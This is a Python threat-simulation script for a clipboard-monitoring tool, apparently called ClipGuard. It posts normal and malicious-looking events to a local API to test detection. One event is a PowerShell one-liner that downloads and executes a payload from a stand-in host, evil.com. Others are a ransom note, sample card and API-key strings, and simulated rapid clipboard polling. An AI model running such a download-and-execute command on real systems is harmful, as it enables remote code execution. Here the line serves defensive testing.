import requests
import time
import random

API_ENDPOINT = "http://localhost:8000/api/v1/events"

def simulate_event(process_name, text, is_anomaly_batch=False):
    event = {
        "process_name": process_name,
        "process_id": random.randint(1000, 9999),
        "text": text,
        "timestamp": time.time()
    }
    try:
        requests.post(API_ENDPOINT, json=event)
    except:
        pass
    
    # Fast polling for anomaly if requested
    if is_anomaly_batch:
        time.sleep(0.01)
    else:
        time.sleep(0.5)

def run_simulation():
    print("Starting ClipGuard Threat Simulation...")
    
    # 1. Normal behavior (trains the model roughly)
    print("Simulating normal behavior (Word, Chrome)...")
    for _ in range(15):
        simulate_event("WINWORD.EXE", "Meeting notes for today...")
        simulate_event("chrome.exe", "https://google.com/search?q=clipguard")
        
    time.sleep(2)
        
    # 2. Insider Threat / PII Exfiltration
    print("Simulating Insider Threat (PII Exfiltration)...")
    simulate_event("notepad.exe", "Here is the customer data: 4532015312349876") # Credit Card
    time.sleep(1)
    simulate_event("slack.exe", "Don't share this: api_key = 'AKIAIOSFODNN7EXAMPLE'") # API Key
    
    time.sleep(2)
    
    # 3. YARA Malware / Ransomware Detection
    print("Simulating APT/Ransomware notes...")
    simulate_event("powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')")
    time.sleep(1)
    simulate_event("cmd.exe", "Your files are encrypted. Send 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")
    
    time.sleep(2)
    
    # 4. Behavioral Anomaly (Malware Rapid Polling)
    print("Simulating Ransomware/Clipboard Hijacker (Rapid Polling Anomalies)...")
    for _ in range(30):
        # A hidden or unknown process rapidly polling to steal crypto addresses
        simulate_event("svchost_suspicious.exe", "Checking clipboard...", is_anomaly_batch=True)
        
    print("Simulation Complete! Check the dashboard.")

if __name__ == "__main__":
    run_simulation()
